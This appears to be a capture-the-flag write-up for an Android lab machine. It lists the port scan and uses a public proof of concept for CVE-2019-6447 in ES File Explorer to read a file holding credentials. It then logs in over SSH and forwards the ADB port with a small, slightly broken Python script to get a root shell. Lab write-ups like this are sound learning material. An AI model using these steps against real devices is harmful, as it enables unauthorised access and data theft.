### Box Info
OS: Android\
IP: 10.10.10.247

## Part I 

### Skills learned:
Curl/Python
Andriod OS + tools

### Enumeration
nmap -p- -A -oN Exploreprts.txt ${IP}
+ 2222 SimplSSH
+ 5555 Andriod Debug bridge
+ 42135 ES File explorer
+ 59777 Bukkit JSONAPI
+ 44233 fingerprint-strings

### Research
Yields CVE-2019-6447
+ https://github.com/fs0c131y/ESFileExplorerOpenPortVuln
+ https://www.exploit-db.com/exploits/50070

### Step 1: File Extraction
+ python3 poc.py ${cmd} ${IP} 
+ python3 poc.py ${cmd} ${IP} $dir/$.jpg
+ [+] Done. Saved as 'out.dat'.

After file downloaded, open 
+ ${IP}:59777/$dir/$.jpg || xdg-open out.dat
+ File gives UN && PW

### Step 2: SSH
+ ssh -p 2222 $UN@${IP} 
+ ${PW}

### Information Gathering
+ :/whoami
u0_a76
+ :/uname -a 
Linux localhost 4.9.214-android-x86_64-g04f9324 #1 SMP PREEMPT Wed Mar 25 17:11:29 CST 2020 x86_64
+ :/find / -perm /6000 2>/dev/null
/system/xbin/procmem
/system/xbin/su
+ :/ $ id
uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768

### Find Flag
Have fun searching! 

## Part II

### Skills learned
ssh port forwarding
adb tool

### Install tools:
adroid-tools-adb

### Port forwarding script.py:
import socket\
import subprocess\
import pyautogui\
import time\
\
def connection_function(host, port):\
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\
    s.connect((host, port))\
    print(s.recv(1024))\
\
connection_function("${IP}", 2222)\
\
def adb_connection(host, port):\
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\
    s.connect((host, port))\
    print(s.recv(1024))\
\
    subprocess.call(['ssh -p 2222 -L 5555:localhost:5555 kristi@${IP}'], shell=True)\
    password = "[PASSWORD OF TARGET MACHINE OF SSH]"\
    print(s.recv(1024))\
\
adb_connection("${IP}", 2222)\

### Start port-forwarding server
+ adb start-server
+ adb connect localhost:5555
+ adb devices

### Initiate root shell:
+ adb -s localhost:5555 shell

### Find root Flag!
Happy searching!
